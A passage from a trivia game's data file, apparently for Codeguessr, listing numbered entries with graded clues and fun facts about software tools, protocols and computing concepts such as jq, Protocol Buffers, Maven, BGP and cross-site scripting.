      'It offers the same modern API as React.',
      'The tiny React alternative whose name adds two letters to the front.'
    ],
    funFact: "Its creator wrote the 2020 blog post that popularised the term 'islands architecture'."
  },
  74: {
    clues: [
      'Stephen Dolan released it in 2012.',
      'It is written in C and has no runtime dependencies.',
      'It has been called sed for a popular data format.',
      'Filters look like .items[] | .name.',
      'Developers pipe API responses into it to make them readable.',
      'The two-letter command-line JSON processor.'
    ],
    funFact: 'Its filter language is a full functional language, with variables, functions and recursion.'
  },
  75: {
    clues: [
      'The OpenID Foundation finalised it in 2014.',
      'It adds an identity layer on top of OAuth 2.0.',
      'It hands the app an ID token, which is a JWT.',
      'Its discovery document lives at /.well-known/openid-configuration.',
      "'Sign in with Google' is built on it.",
      'The identity protocol often shortened to OIDC.'
    ],
    funFact: 'OAuth on its own only grants access; this layer on top is what tells an app who the user actually is.'
  },
  76: {
    clues: [
      'It was created in 2016 by a small company called Kadira.',
      'When that company shut down, the community took it over.',
      "You write 'stories', each showing a component in one state.",
      'It runs as a separate workshop app next to your real one.',
      'Design systems use it to develop and document UI components in isolation.',
      "The UI component workshop named after a children's book."
    ],
    funFact: 'Its stories format, Component Story Format, is just ES modules, so the same stories can be reused in tests.'
  },
  77: {
    clues: [
      'Google used it internally from about 2001 and open-sourced it in 2008.',
      'Messages are described in .proto files.',
      'Every field has a number, which is what goes over the wire instead of its name.',
      'A compiler called protoc generates code for many languages.',
      'gRPC uses it as its default message format.',
      "Google's compact binary serialisation format, often shortened to protobuf."
    ],
    funFact: 'Because fields are identified by numbers, you can add new fields without breaking old readers.'
  },
  78: {
    clues: [
      'James Long released it in 2017.',
      'Its name echoes a 1990s paper by Philip Wadler about printing code.',
      'It deliberately offers very few options, to end arguments about style.',
      'It throws away your formatting and prints the code again from scratch.',
      'Its settings live in a file such as .prettierrc.',
      "The opinionated code formatter whose name means 'more beautiful'."
    ],
    funFact: "Its algorithm is based on Philip Wadler's paper 'A prettier printer'."
  },
  79: {
    clues: [
      'It began as a Google Summer of Code project by David Cournapeau in 2007.',
      'French research institute INRIA took the lead in developing it.',
      'Every model follows the same pattern: fit, then predict.',
      'Random forests, k-means and logistic regression are all a single import away.',
      'Its import name is sklearn.',
      "The classic machine learning library for Python, named as a 'SciPy toolkit'."
    ],
    funFact: "The 'scikit' in its name means SciPy toolkit, a name used for add-on packages built on top of SciPy."
  },
  80: {
    clues: [
      'Two statisticians at the University of Auckland started it in the early 1990s.',
      'It is an open-source take on S, a statistics language from Bell Labs.',
      'Its most common assignment operator is an arrow: <-.',
      'Packages such as ggplot2 and the tidyverse come from its archive, CRAN.',
      'Statisticians and data scientists use it for data frames, models and plots.',
      'The statistics language with a one-letter name.'
    ],
    funFact: "Its name comes from the first letter of its creators' first names, Ross Ihaka and Robert Gentleman, and is a nod to S."
  },
  81: {
    clues: [
      'John-David Dalton started it in 2012 as a fork of Underscore.js.',
      'Its name is a pun: another word for the character it is imported as.',
      'debounce, throttle, get and cloneDeep are among its best-known functions.',
      'For years it was one of the most depended-upon packages on npm.',
      'Modern JavaScript made many of its functions unnecessary.',
      'The JavaScript utility library imported as _.'
    ],
    funFact: "Its name plays on 'low dash', another name for the underscore character it is usually imported as."
  },
  82: {
    clues: [
      'The W3C published its Level 1 specification in 1998.',
      "Before that, browsers had incompatible versions now called 'Level 0'.",
      'It represents an HTML page as a tree of nodes.',
      'document.getElementById and querySelector search it.',
      "React popularised a 'virtual' copy of it.",
      'The Document Object Model.'
    ],
    funFact: 'Touching the real one is slow compared to plain JavaScript, which is why frameworks try to batch changes to it.'
  },
  83: {
    clues: [
      'Google open-sourced it in 2015.',
      'Internally, Google still uses a version with an anagram of its name.',
      'Its build files are written in Starlark, a dialect of Python.',
      'It aims for hermetic, reproducible builds with remote caching and execution.',
      'It is built for enormous monorepos in many languages.',
      "Google's build system, named after a herb."
    ],
    funFact: 'Its name is an anagram of Blaze, the internal Google build system it came from.'
  },
  84: {
    clues: [
      "Its creators announced it in 2012 in a blog post saying they were 'greedy'.",
      'It wants the speed of a compiled language with the ease of a scripting language.',
      'Multiple dispatch is at the heart of its design.',
      'It compiles just in time via LLVM, and its arrays start at 1.',
      'It came out of MIT and is popular in scientific computing.',
      "The numerical language with a woman's first name."
    ],
    funFact:
      "The 2012 post 'Why We Created Julia' listed wanting the speed of C, the dynamism of Ruby, the math notation of Matlab and more, all in one language."
  },
  85: {
    clues: [
      'It was first released in Sweden in 1995.',
      'It is the M in the LAMP stack.',
      'Sun Microsystems bought it in 2008 for about a billion dollars.',
      'Oracle became its owner in 2010, which led to a well-known fork.',
      'Its dolphin logo is called Sakila.',
      "The popular open-source database named after Monty Widenius's daughter My."
    ],
    funFact: 'Its dolphin was named Sakila after a naming contest, won by a developer from Eswatini.'
  },
  86: {
    clues: [
      "Tim Sweeney's company debuted it in 1998 with a first-person shooter of the same name.",
      'You can script it in C++ or with visual node graphs called Blueprints.',
      'Its fifth version brought Nanite geometry and Lumen lighting.',
      'The Mandalorian was filmed in front of LED walls rendered live with it.',
      'Fortnite is built on it.',
      "Epic Games' game engine, whose name means not real."
    ],
    funFact: 'Film and TV productions now use it for virtual sets, rendering backgrounds in real time on giant LED screens.'
  },
  87: {
    clues: [
      'Fabien Potencier released it in 2005 at the French agency SensioLabs.',
      "Its name was chosen partly to keep the 'sf' prefix already used in its code.",
      'Its standalone components are used by Laravel, Drupal and many others.',
      'Its template engine is Twig.',
      'Its applications are organised into bundles.',
      'The PHP framework whose name sounds like a piece of orchestral music.'
    ],
    funFact: 'Laravel, its biggest rival, is built on many of its components.'
  },
  88: {
    clues: [
      'Daniel Stenberg, from Sweden, has led it since it got its current name in 1998.',
      'It started as a tool to fetch currency exchange rates for an IRC bot.',
      'Its library runs in cars, TVs, phones and game consoles.',
      'Flags such as -X, -H, -d and -L are known by heart by many developers.',
      'It supports dozens of protocols, not just HTTP.',
      'The command-line tool for transferring data with URLs.'
    ],
    funFact: 'Its website estimates it runs in more than twenty billion installations worldwide.'
  },
  89: {
    clues: [
      'Its first drafts appeared in 2009, and the syntax changed twice before browsers agreed.',
      'It lays out items along a single main axis.',
      'justify-content and align-items are its most used properties.',
      'It finally made centring a div vertically easy.',
      'A game with a frog on a lily pad teaches it.',
      'The CSS layout mode you turn on with display: flex.'
    ],
    funFact: 'The browser game Flexbox Froggy teaches it by moving frogs onto their lily pads.'
  },
  90: {
    clues: [
      'A company founded in Prague in 2000 released it in 2001.',
      'Its refactorings and code completion set a new bar for Java IDEs.',
      'Its makers also created the Kotlin language.',
      'Android Studio is built on its open-source edition.',
      'It comes in a free Community edition and a paid Ultimate edition.',
      "JetBrains' flagship Java IDE."
    ],
    funFact: 'JetBrains was founded in Prague by three Russian developers, and it still has a large office there.'
  },
  91: {
    clues: [
      'It was popularised by the 1999 book The Pragmatic Programmer.',
      'It needs no software, only a patient listener.',
      'You explain your code, line by line, out loud.',
      'Halfway through the explanation, you usually spot the bug yourself.',
      'The listener is traditionally a yellow bath toy.',
      'Explaining your code to a toy duck to find a bug.'
    ],
    funFact: "For April Fools' Day 2018, Stack Overflow launched 'Quack Overflow', an animated duck that listened to your questions."
  },
  92: {
    clues: [
      'It came out of the Apache Jakarta project and reached 1.0 in 2004.',
      'It prefers convention over configuration: code goes in src/main/java.',
      'Every artifact has a groupId, an artifactId and a version.',
      'Its central repository is where most Java libraries are published.',
      'Its project file is called pom.xml.',
      'The Java build tool whose name is Yiddish for an expert.'
    ],
    funFact: 'Its name comes from Yiddish, where a maven is someone who has gathered a lot of knowledge.'
  },
  93: {
    clues: [
      'It was specified in 1998 because the internet was running out of addresses.',
      'Its addresses are 128 bits long.',
      'They are written in hexadecimal groups separated by colons.',
      'Its loopback address is ::1.',
      'Big websites switched it on permanently at the World Launch on 6 June 2012.',
      'The successor to IPv4.'
    ],
    funFact: 'Version 5 was skipped, because that number had already been used for an experimental streaming protocol.'
  },
  94: {
    clues: [
      'Stuart Feldman wrote it at Bell Labs in 1976.',
      'It rebuilds a target only when one of its prerequisites is newer.',
      'Its recipe lines must start with a tab, not spaces.',
      'Many projects use .PHONY targets such as all, clean and install.',
      'Its instructions live in a file called Makefile.',
      'The classic Unix build tool whose name is a verb for creating.'
    ],
    funFact: 'Feldman later said he kept the tab requirement because he already had about a dozen users and did not want to break their files.'
  },
  95: {
    clues: [
      "Mark Shuttleworth's company released its first version in October 2004.",
      'Its version numbers are the year and month of release, like 24.04.',
      'Every release has an alliterative animal code name, such as Noble Numbat.',
      'It is based on Debian, and a long-term support version comes out every two years.',
      'Canonical makes it, and it is one of the most popular Linux distributions.',
      'The Linux distribution named after a southern African word for humanity towards others.'
    ],
    funFact: 'Its very first release was called Warty Warthog, and since Dapper Drake the code names have followed the alphabet.'
  },
  96: {
    clues: [
      'Paul Falstad wrote its first version in 1990 as a student at Princeton.',
      'Its name came from the login name of a teaching assistant at Princeton.',
      'Its glob qualifiers let you write things like *(.m-1) for files changed today.',
      'A community framework called Oh My … made it famous for themes and plugins.',
      'Since macOS Catalina in 2019, it is the default shell on the Mac.',
      'The Z shell.'
    ],
    funFact: 'The name comes from Zhong Shao, then a teaching assistant at Princeton, whose login was zsh.'
  },
  97: {
    clues: [
      'Mark Raasveldt and Hannes Mühleisen created it at CWI in Amsterdam in 2019.',
      'It runs inside your process, with no server to install.',
      'It is often described as SQLite for analytics.',
      'It queries CSV and Parquet files directly with SQL.',
      'Data scientists use it from Python, R and even the browser.',
      'The analytical database named after a water bird.'
    ],
    funFact: 'It was born at the Dutch national research institute CWI, and is named after a pet duck called Wilbur.'
  },
  98: {
    clues: [
      'Alex Russell and Frances Berriman coined the term in 2015.',
      'In 2007, Steve Jobs first told developers to build iPhone apps this way.',
      'It needs a web app manifest and a service worker.',
      'It can be installed to the home screen and work offline.',
      'Codeguessr is one.',
      'A Progressive Web App.'
    ],
    funFact: "Before the App Store existed, Steve Jobs called web apps for the iPhone a 'very sweet solution'."
  },
  99: {
    clues: [
      'A team led by Lars Bak in Aarhus, Denmark, built it for Google.',
      'It shipped with the first version of Chrome in 2008.',
      'It compiles JavaScript to machine code instead of only interpreting it.',
      'Its pipeline has an interpreter called Ignition and an optimising compiler called TurboFan.',
      'Node.js and Deno are built on it.',
      "Google's JavaScript engine, named after a car engine."
    ],
    funFact: 'Its speed kicked off a performance race between browsers that made modern web apps possible.'
  },
  100: {
    clues: [
      'It was started in 2016, and Zoltan Kochan became its long-time maintainer.',
      'It keeps a single content-addressable store of every package version on your disk.',
      'It links packages into node_modules instead of copying them.',
      'Its strict layout stops code from importing packages it never declared.',
      'It is known for saving gigabytes of disk space in large monorepos.',
      "The 'performant' package manager, with a four-letter lowercase name."
    ],
    funFact: 'Because every version is stored only once, a hundred projects using the same library share one copy on disk.'
  },
  101: {
    clues: [
      'Tim Wood released it in 2011.',
      'It made parsing and formatting dates in JavaScript bearable.',
      "Calls like .add(7, 'days').format('LL') are typical.",
      'Its objects are mutable, which caused many subtle bugs.',
      'In 2020 its own maintainers recommended not using it for new projects.',
      'The classic JavaScript date library whose name means an instant.'
    ],
    funFact: 'Its maintainers now point people to Luxon, Day.js, date-fns and the upcoming Temporal API instead.'
  },
  102: {
    clues: [
      'Its first public service, a message queue, launched in 2004.',
      'In 2006 it launched object storage and virtual servers, and cloud computing took off.',
      'Andy Jassy led it before becoming CEO of the parent company.',
      'When its us-east-1 region has a bad day, half the internet notices.',
      'Its yearly conference in Las Vegas is called re:Invent.',
      "Amazon's cloud platform, with a three-letter abbreviation."
    ],
    funFact: 'The first service it made public was SQS, the Simple Queue Service, in 2004, two years before S3 and EC2.'
  },
  103: {
    clues: [
      'It came out of the Vite team, with Anthony Fu among its creators, around 2021.',
      'It reuses your Vite configuration and plugins.',
      'Its API is compatible with Jest, so describe, it and expect work the same.',
      'It can run tests in a real browser, and even tests written inside source files.',
      "Codeguessr's database tests run with it.",
      "The test runner powered by Vite, whose name adds 'test' to it."
    ],
    funFact: "Angular's newer unit-test builder can use it instead of Karma, which is what Codeguessr does."
  },
  104: {
    clues: [
      'Jesper Nøhr launched it in 2008.',
      'At first it hosted only Mercurial repositories.',
      'Atlassian bought it in 2010.',
      'It dropped Mercurial support entirely in 2020.',
      'It integrates tightly with Jira and Confluence.',
      "Atlassian's Git hosting service, named after a container for bits."
    ],
    funFact: 'It was one of the last major hosts for Mercurial, which is why its 2020 decision to drop it made headlines.'
  },
  105: {
    clues: [
      'It grew out of the internal chat tool of a game studio making a game called Glitch.',
      'Its co-founder Stewart Butterfield had earlier co-founded Flickr.',
      'Its name has been explained as a backronym: Searchable Log of All Conversation and Knowledge.',
      'Salesforce bought it in 2021 for about 27.7 billion dollars.',
      'Channels starting with # replaced a lot of work email.',
      'The workplace chat app whose name also means loose or lazy.'
    ],
    funFact: 'Flickr also came out of a failed online game by the same founder, Game Neverending.'
  },
  106: {
    clues: [
      'Every instruction you write maps to exactly one machine instruction.',
      'Mnemonics such as MOV, JMP and PUSH stand in for raw numbers.',
      'You juggle registers and the stack by hand.',
      'There is a different flavour for every processor family, such as x86 or ARM.',
      'The lowest-level language most programmers ever see.',
      'The language whose name also means a gathering of people.'
    ],
    funFact: 'The 1999 game RollerCoaster Tycoon was written almost entirely in this, by one developer, Chris Sawyer.'
  },
  107: {
    clues: [
      'Microsoft released it in 2020.',
      'It was built by the same people who had built a similar tool at Google.',
      'One API drives Chromium, Firefox and WebKit.',
      'It waits for elements automatically, and its codegen records your clicks as a test.',
      "Codeguessr's end-to-end tests are written with it.",
      'The browser automation and testing framework whose name means someone who writes plays.'
    ],
    funFact: 'Its trace viewer lets you step through a failed CI test with screenshots, network calls and console logs for every action.'
  },
  108: {
    clues: [
      'The German mathematician Paul Bachmann introduced it in 1894.',
      "Edmund Landau made it popular, and the letter originally stood for 'Ordnung'.",
      'Donald Knuth brought it into computer science in the 1970s.',
      'It describes how running time grows as the input grows, ignoring constants.',
      'O(1), O(log n), O(n log n) and O(n²) are its most famous members.',
      "The notation for describing an algorithm's complexity, named after a capital letter."
    ],
    funFact: 'In a 1976 letter, Knuth argued the letter is really a Greek omicron.'
  },
  109: {
    clues: [
      'Maxime Beauchemin started it at Airbnb in 2014.',
      'Workflows are defined in Python as directed acyclic graphs.',
      'Each step in a workflow is an operator, and a scheduler runs them on time.',
      'It became a top-level Apache project in 2019.',
      'Data engineers use it to orchestrate their pipelines.',
      'The workflow scheduler whose name describes moving air.'
    ],
    funFact: 'Its creator also created Apache Superset, a data visualisation tool, at Airbnb.'
  },
  110: {
    clues: [
      'It was announced in 2008 under the code name Red Dog.',
      "It launched in 2010 with the name of its maker's operating system in front.",
      "That prefix was replaced by the company's own name in 2014.",
      'Its huge partnership with OpenAI made it the home of many AI workloads.',
      "It is the second-largest cloud platform, behind Amazon's.",
      "Microsoft's cloud, named after a bright sky-blue colour."
    ],
    funFact: 'It started out as Windows Azure, and was renamed Microsoft Azure in 2014 as it ran more and more Linux.'
  },
  111: {
    clues: [
      'Nicholas C. Zakas created it in 2013.',
      'Unlike earlier tools, every one of its rules is a plugin you can turn on or off.',
      "Its version 9 made a new 'flat config' file the default.",
      'A special comment can switch off one of its rules for just the next line.',
      'It is the most widely used linter for JavaScript and TypeScript.',
      'The pluggable JavaScript linter, named after ECMAScript and lint.'
    ],
    funFact: 'Its creator wrote it because JSHint could not easily be extended with custom rules.'
  },
  112: {
    clues: [
      "It was described in a 1936 paper called 'On Computable Numbers'.",
      'It has an infinite tape, a read-write head and a table of states.',
      'It was used to prove that the halting problem cannot be solved.',
      'A language that can simulate it is called complete, after its inventor.',
      'Its inventor also broke codes at Bletchley Park.',
      "Alan Turing's abstract model of computation."
    ],
    funFact: 'Turing wrote the paper at 23, before modern computers existed.'
  },
  113: {
    clues: [
      'Vint Cerf and Bob Kahn described it in a 1974 paper.',
      "On 1 January 1983, the ARPANET switched over to it in a single 'flag day'.",
      'Every connection starts with a three-way handshake: SYN, SYN-ACK, ACK.',
      'It guarantees that bytes arrive in order and resends what gets lost.',
      'HTTP/1.1 and HTTP/2 run on top of it.',
      'The Transmission Control Protocol.'
    ],
    funFact: "Its congestion control was added in 1988 by Van Jacobson, after the early internet suffered a series of 'congestion collapses'."
  },
  114: {
    clues: [
      'Andreas Reuter and Theo Härder coined the acronym in 1983.',
      "It builds on Jim Gray's earlier work on transactions.",
      'It promises all-or-nothing, valid states, no interference and no data loss after commit.',
      'NoSQL systems sometimes offer BASE instead, as a chemistry joke.',
      'PostgreSQL transactions guarantee it.',
      'Atomicity, Consistency, Isolation, Durability.'
    ],
    funFact: 'BASE, the looser alternative, stands for Basically Available, Soft state, Eventual consistency, chosen as the chemical opposite.'
  },
  115: {
    clues: [
      'Marc Andreessen and Jim Clark founded the company behind it in 1994.',
      'Many of its developers had built Mosaic at the University of Illinois.',
      "Its company's 1995 stock market debut kicked off the dot-com boom.",
      'It introduced cookies, JavaScript and SSL to the web.',
      'Its source code was released in 1998 and became the Mozilla project.',
      "The dominant browser of the mid-1990s, with a ship's wheel in its logo."
    ],
    funFact: "Mozilla, the name that lived on after it, was the internal code name for the browser: 'Mosaic killer'."
  },
  116: {
    clues: [
      'John McCarthy described it in 1958 at MIT.',
      'Two of its basic functions are named after parts of an IBM 704 machine word.',
      'In it, code and data have the same shape, which makes powerful macros possible.',
      'Its programs are made of S-expressions.',
      'Emacs and AutoCAD both embed a dialect of it.',
      'The LISt Processing language, famous for its parentheses.'
    ],
    funFact: 'Garbage collection was invented for this language, by John McCarthy, around 1959.'
  },
  117: {
    clues: [
      'A foundation in Cambridge, England, launched it in 2012 to get children programming.',
      'Eben Upton led the project.',
      'Its first model cost 35 dollars and was the size of a credit card.',
      'Its GPIO pins let you wire up LEDs, sensors and motors.',
      'Its company floated on the London Stock Exchange in 2024.',
      'The tiny single-board computer named after a fruit and a Greek letter.'
    ],
    funFact: 'The Pi in its name comes from Python, the language it was meant to teach.'
  },
  118: {
    clues: [
      'John McCarthy invented it for Lisp around 1959.',
      'Mark-and-sweep and reference counting are two classic approaches.',
      'Generational versions rely on the observation that most objects die young.',
      "Its 'stop-the-world' pauses can make latency spike.",
      'Java, Go, C# and JavaScript use it; C and Rust do not.',
      'Automatically freeing memory that is no longer used.'
    ],
    funFact: 'In 2020 Discord rewrote a service from Go in Rust, partly to get rid of latency spikes it caused every two minutes.'
  },
  119: {
    clues: [
      'It grew out of a chat startup called Envolve in 2011.',
      'Its first product was a realtime database that synced JSON to every client.',
      'Google acquired it in 2014.',
      'Its document database Firestore, authentication and hosting are often used together.',
      'It lets mobile and web apps skip writing their own backend.',
      "Google's app development platform, whose name combines fire and a base."
    ],
    funFact: 'Its founders noticed that developers were using their chat service to sync other app data, so they turned that into a product.'
  },
  120: {
    clues: [
      'Microsoft security engineers coined its full name around 2000.',
      'Its abbreviation uses an X to avoid confusion with style sheets.',
      'In 2005 the Samy worm used it to add a million friends on MySpace in under a day.',
      'It happens when user input is rendered as HTML without escaping.',
      'A Content Security Policy makes it much harder.',
      'Cross-site scripting.'
    ],
    funFact: "The Samy worm added the line 'but most of all, samy is my hero' to every infected MySpace profile."
  },
  121: {
    clues: [
      'A group of companies including Intel released its first version in 1996.',
      'Ajay Bhatt at Intel is often called its co-inventor.',
      'Its classic rectangular plug famously takes three tries to insert.',
      'Its reversible Type-C connector arrived in 2014.',
      'Since the end of 2024, the EU has required new phones to charge through it.',
      'The Universal Serial Bus.'
    ],
    funFact: 'A running joke says its old rectangular plug has three sides: wrong, still wrong, and right.'
  },
  122: {
    clues: [
      'Edsger Dijkstra illustrated it with philosophers sharing forks around a table.',
      'Edward Coffman listed four conditions for it in 1971.',
      "Thread A holds one lock and waits for B's, while B waits for A's.",
      'Always taking locks in the same order prevents it.',
      'Databases detect it and kill one of the transactions.',
      'When two processes wait on each other forever.'
    ],
    funFact: 'Dijkstra first set the dining philosophers problem as an exam question for his students.'
  },
  123: {
    clues: [
      'Richard Stallman wrote it in 1986 for the GNU project.',
      'It can open a core dump to see where a program crashed.',
      'Commands such as break, run, next, step and bt are its basics.',
      'It has a text-based UI mode, and many IDEs drive it behind the scenes.',
      'It debugs C, C++, Rust, Go and more.',
      'The GNU Debugger.'
    ],
    funFact: "Typing 'bt' prints a backtrace: the chain of function calls that led to the current point."
  },
  124: {
    clues: [
      'Silicon Graphics released it in 1992, based on its own IRIS GL.',
      'It works like a big state machine.',
      'Old code drew triangles between glBegin and glEnd calls.',
      'Its shaders are written in GLSL, and the Khronos Group maintains it.',
      'Apple deprecated it in 2018, and Vulkan is its low-level successor.',
      "The cross-platform graphics API whose name starts with 'Open'."
    ],
    funFact: 'Games such as Quake helped make it popular on PCs in the late 1990s.'
  },
  125: {
    clues: [
      'Jarred Sumner released it in 2022.',
      'It is written in Zig.',
      "It uses JavaScriptCore, Safari's engine, instead of V8.",
      'It is a runtime, bundler, test runner and package manager in one binary.',
      'It aims to be a drop-in replacement for Node.js, only faster.',
      'The JavaScript runtime named after a small bread roll.'
    ],
    funFact: 'Its logo is a bread roll with a face.'
  },
  126: {
    clues: [
      'Yandex developed it for its web analytics service and open-sourced it in 2016.',
      'It stores data by column, not by row.',
      'It can aggregate billions of rows per second.',
      'It became an independent company in 2021.',
      'It is a popular choice for real-time analytics.',
      'The columnar database whose name joins a mouse action and a building.'
    ],
    funFact: "Its name comes from 'clickstream' and 'data warehouse'."
  },
  127: {
    clues: [
      'Wes McKinney started it in 2008 while working at a hedge fund.',
      "Its name comes from 'panel data', a term from econometrics.",
      'Its central object is the DataFrame.',
      'read_csv, groupby and merge are some of its most used functions.',
      'It is almost always imported as pd.',
      'The Python data analysis library that shares its name with black-and-white bears.'
    ],
    funFact: "Its name comes from 'panel data' and also plays on 'Python data analysis'."
  },
  128: {
    clues: [
      'Mark Crispin designed it at Stanford in 1986.',
      'Unlike its older rival, it keeps messages on the server.',
      'It syncs folders and read status across all your devices.',
      'It uses port 143, or 993 when encrypted.',
      'Mail apps use it to read, while SMTP is used to send.',
      'The Internet Message Access Protocol.'
    ],
    funFact: 'Its older rival, POP3, downloads messages and usually deletes them from the server, which is why it struggles with more than one device.'
  },
  129: {
    clues: [
      'Dan Abramov wrote it in 2015 to demo time-travel debugging at a conference talk.',
      'It borrowed ideas from Flux and from the Elm architecture.',
      'All state lives in one store and changes only through dispatched actions.',
      'Pure functions called reducers compute the next state.',
      'Its official Toolkit cut down the boilerplate it was infamous for.',
      'The predictable state container often paired with React, whose name mixes reducer and Flux.'
    ],
    funFact: "It was first shown at React Europe 2015, in Dan Abramov's talk 'Hot Reloading with Time Travel'."
  },
  130: {
    clues: [
      'It became a W3C recommendation in 2014 and now lives in the Fetch standard.',
      "It is a controlled way to relax the browser's same-origin policy.",
      "For some requests the browser first sends an OPTIONS 'preflight'.",
      'The server answers with headers such as Access-Control-Allow-Origin.',
      'Its error in the browser console has confused countless front-end developers.',
      'Cross-Origin Resource Sharing.'
    ],
    funFact: 'It is enforced by the browser, not the server: the same request from curl works fine, which is why its errors feel so baffling.'
  },
  131: {
    clues: [
      "Three developers in Copenhagen started it, and it was launched at Apple's WWDC in 2005.",
      'At first it ran only on the Mac.',
      'Games for it are scripted in C#.',
      'A 2023 plan to charge a fee per game install caused an uproar and was later scrapped.',
      'Pokémon Go, Hollow Knight and Among Us were built with it.',
      'The game engine whose name means oneness or togetherness.'
    ],
    funFact: 'Before focusing on the engine, its founders used it to make a game called GooBall.'
  },
  132: {
    clues: [
      'Borland released it in 1995, with Anders Hejlsberg as chief architect.',
      'Its name was chosen because it was meant to talk to databases such as Oracle.',
      'It uses Object Pascal and a component library called the VCL.',
      'You built Windows apps by dropping components on a form, very quickly.',
      'It is still sold today by Embarcadero.',
      "The rapid application development tool named after a Greek oracle's town."
    ],
    funFact: 'The name comes from the saying that if you want to talk to the Oracle, you go to Delphi.'
  },
  133: {
    clues: [
      'Miško Hevery, who also created AngularJS, started it at Builder.io.',
      "Instead of hydration, it promotes 'resumability'.",
      'A dollar sign at the end of a function name marks a lazy-loading boundary.',
      'It aims to load almost no JavaScript until the user interacts.',
      'Its components use JSX but are not React.',
      'The web framework whose name is a misspelling of fast.'
    ],
    funFact: 'It serialises the application state into the HTML, so the browser can pick up where the server left off instead of starting over.'
  },
  134: {
    clues: [
      'It grew out of a language called B at Bell Labs in the early 1970s.',
      'In 1973 an operating system was rewritten in it, which was unusual for the time.',
      'A 1978 book by Kernighan and Ritchie served as its unofficial specification for a decade.',
      'Pointers, manual memory management with malloc and free, and header files ending in .h.',
      'Most operating system kernels, including Linux, are still written in it.',
      "Dennis Ritchie's systems programming language, named with a single letter."
    ],
    funFact: "The tradition of a first program that prints 'hello, world' was popularised by the Kernighan and Ritchie book about this language."
  },
  135: {
    clues: [
      'Google published its source code in September 2008.',
      'Its rendering engine, Blink, was forked from WebKit in 2013.',
      'Microsoft Edge, Brave, Opera and Vivaldi are all built on it.',
      'Electron apps bundle a copy of it.',
      "It is the open-source project behind Google's browser.",
      'The open-source browser named after a shiny metallic element.'
    ],
    funFact: 'When Microsoft rebuilt Edge on it in 2020, it became the engine behind the large majority of desktop browsers.'
  },
  136: {
    clues: [
      'IBM released it as open source in 2001.',
      'An independent foundation has governed it since 2004.',
      'Its name was widely read as a jab at Sun Microsystems.',
      'Almost everything in it is a plugin, and for years each yearly release had its own name, such as Kepler or Luna.',
      'For a decade it was the default IDE for Java developers.',
      'The Java IDE named after the moment the moon blocks the sun.'
    ],
    funFact: 'From Galileo in 2009 to Photon in 2018, its yearly release names followed the alphabet: Helios, Indigo, Juno, Kepler, Luna, Mars, Neon, Oxygen.'
  },
  137: {
    clues: [
      'Netscape introduced it in 1994 for its Navigator browser.',
      "It runs the web's main protocol over TLS, originally SSL.",
      'Its default port is 443.',
      "Let's Encrypt, launched in 2015, made the certificates it needs free.",
      "Since 2018, Chrome marks sites without it as 'Not secure'.",
      'The secure version of HTTP, shown with a padlock.'
    ],
    funFact: "Let's Encrypt made the certificates free and automatic, and a large majority of web page loads now use it."
  },
  138: {
    clues: [
      'Andreas Rumpf started it in 2008 under a longer name.',
      'In 2014 it was renamed to a shorter, three-letter name.',
      'Its syntax looks like Python, with significant indentation.',
      'It compiles to C, C++ or JavaScript.',
      'It has powerful macros and a garbage collector you can swap out.',
      'The language that shares its name with a matchstick game.'
    ],
    funFact: 'It used to be called Nimrod, after the biblical hunter, before the shorter name was adopted in 2014.'
  },
  139: {
    clues: [
      'Its first product, App Engine, launched in preview in 2008.',
      'It offers Spanner, a database that uses atomic clocks to agree on time.',
      'Its data warehouse, BigQuery, can scan terabytes in seconds.',
      'Its managed Kubernetes service comes from the company that invented Kubernetes.',
      'It is the third of the big three public clouds.',
      'The cloud platform of the search giant.'
    ],
    funFact: 'Spanner keeps its data consistent worldwide with TrueTime, an API backed by GPS receivers and atomic clocks in its data centres.'
  },
  140: {
    clues: [
      'Mark Anders and Scott Guthrie built its first prototype in 1997.',
      "It replaced Classic ASP, Microsoft's Active Server Pages.",
      'Web Forms, MVC and Razor Pages are three of its programming models.',
      'Its cross-platform rewrite came in 2016 with the Kestrel web server.',
      'Stack Overflow is one of its best-known sites.',
      "Microsoft's web framework for .NET."
    ],
    funFact: "Scott Guthrie, one of its creators, went on to lead Microsoft's cloud division."
  },
  141: {
    clues: [
      'Ken Thompson and Dennis Ritchie started it at Bell Labs in 1969 on a PDP-7.',
      'Its name was a pun on Multics, a larger project Bell Labs had left.',
      'Its philosophy: write programs that do one thing well and work together.',
      'Pipes, added in 1973, let the output of one program become the input of the next.',
      'Linux, macOS and the BSDs all follow its design.',
      'The operating system from Bell Labs whose name is often written in capitals.'
    ],
    funFact: 'Its time is counted in seconds since 1 January 1970, the so-called epoch.'
  },
  142: {
    clues: [
      'OASIS published its first version in 2002, and version 2.0 in 2005.',
      'It passes signed XML assertions from an identity provider to a service provider.',
      'Bugs in XML signature checking have made it a favourite target for security researchers.',
      'It powers single sign-on in many large companies.',
      "Many SaaS products only offer it on their most expensive plan, a practice called the 'SSO tax'.",
      'The Security Assertion Markup Language.'
    ],
    funFact: 'A website called sso.tax lists software vendors that charge much more for plans with single sign-on.'
  },
  143: {
    clues: [
      'Ken Thompson wrote it in 1973, reportedly overnight.',
      'Its name comes from an ed editor command: g/re/p.',
      'Flags such as -i, -r, -v and -n are its daily bread.',
      'Tools like ack and ripgrep were built as faster alternatives.',
      'Its name became a verb for searching text.',
      'The Unix command that prints lines matching a pattern.'
    ],
    funFact: 'Its name spells out an ed command: globally search for a regular expression and print the matching lines.'
  },
  144: {
    clues: [
      'Its first version was sketched on two napkins at an IETF meeting in 1989.',
      'It exchanges routes between autonomous systems.',
      'Every network announces which IP ranges it can reach.',
      'In 2008, a bad announcement from Pakistan made YouTube unreachable worldwide.',
      'In October 2021, a mistake with it took Facebook, Instagram and WhatsApp offline for hours.',
      'The Border Gateway Protocol, the routing glue of the internet.'
    ],
    funFact: "It is nicknamed the 'two-napkin protocol', because Kirk Lougheed and Yakov Rekhter first sketched it on napkins over lunch."
  },
  145: {
    clues: [
      'Google Brain released it as open source in November 2015.',
      'It succeeded an internal Google system called DistBelief.',
      'Google designed its own chips, TPUs, to run it faster.',
      'Keras became its official high-level API.',
      'For years it was the most popular deep learning framework.',
      "Google's machine learning library, named after multidimensional arrays moving through a graph."
    ],
    funFact: 'Its name describes how it works: tensors, multidimensional arrays, flow through a graph of operations.'
  },
  146: {
    clues: [
      'Miško Hevery and Adam Abrons started it in 2009, and it soon became a Google project.',
      'It made two-way data binding mainstream.',
      'Its controllers talked to the view through a special object called $scope.',
      'Attributes such as ng-app, ng-model and ng-repeat turned plain HTML into an app.',
      'Its long-term support officially ended on 31 December 2021.',
      "The first version of Google's framework, before the rewrite dropped the two letters at the end."
    ],
